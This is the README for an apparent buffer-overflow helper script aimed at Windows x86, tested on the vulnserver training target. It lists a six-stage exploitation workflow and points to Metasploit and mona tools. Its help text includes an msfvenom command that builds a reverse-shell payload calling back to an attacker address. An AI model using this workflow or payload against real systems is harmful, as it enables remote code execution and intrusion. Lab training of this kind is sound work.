# OverflowHelper
OverflowHelper aids in Buffer Overflow development on Windows x86 architecture. This script was tested on vulnserver on 32-bit a Windows 7 machine.

## Usage:

Clone repository:
```
git clone https://github.com/rhuss623/OverflowHelper.git
```

Change permissions:
```
cd OverflowHelper
chmod u+x overflow_helper.py
```

Execute script with arguments (described in "Help")
```
python overflow_helper.py
```
Further instructions are enumerated in the "help" instructions (provided below). 

Note that several sections of the script require hard-coded revision, including:
The subtraction of bad characters frrom the badchars payload in program #4 and the final shell payload in program #6 

## Help:

Here follows the "help" instructions, accessible via `-h`


Buffer Overflow Helper

positional arguments:
  host              Remote target host, e.g. 10.10.1.14
  port              Remote target port, e.g. 9999
  function          Function used in buffer overflow attempt, e.g. TRUN
  program           Enter a number, 1-6, as argument: 
                    
                    1. Fuzzing 
                    2. Identifying Offset 
                    	REQUIRES -pattern 
                    3. Overwriting EIP 
                    	REQUIRES -offset
                    4. Identify Bad Characters 
                    	REQUIRES -offset
                    5. Return Address 
                    	REQUIRES -offset && -ret
                    6. Final Payload 
                    	REQUIRES -offset && -ret && -pay
                    
                    ********************************
                    Suggested additional resources:
                    
                    Pattern creation (Identifying offset):
                    	pattern_create.rb
                    	pattern_offset.rb
                    
                    Locating return address:
                    	mona.py
                    	nasm_shell.rb
                    
                    Creating payload:
                    	msfvenom 
                    ********************************
                    
                    Happy Hacking you Hackney Hip-Swaying Hokey Pokers :)
                    

optional arguments:
  -h, --help        show this help message and exit
  -pattern PATTERN  Use w/ PROGRAM 2
                    
                    Pattern created using pattern-create.rb
                    
                    On kali, this is the output from: 
                    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <number from fuzzing phase> 
                    
                    To identify the offset, enter the characters in EIP into:
                    
                    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <number> -q <EIP characters>
                    
  -offset OFFSET    Use w/ PROGRAMS 3, 4, 5, and 6
                    
                    Offset value: e.g. 2020
                    
  -ret RET          Use w/ PROGRAMS 5 and 6
                    
                    Enter return address as it will be entered in EIP
                    
                    e.g.,for return address 625011af, one might enter \\xaf\\x11\\x50\\x62
                    
  -pay PAY          Use w/ PROGRAM 6
                    
                    Enter shellcode
                    
                    e.g. Output from command:
                    
                    msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.147 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "<INSERT BAD CHARS HERE e.g. null byte: \x00>"
                    
  -nops NOPS        Use w/ PROGRAM 6
                    
                    Enter number of nops preceding payload, e.g. 32
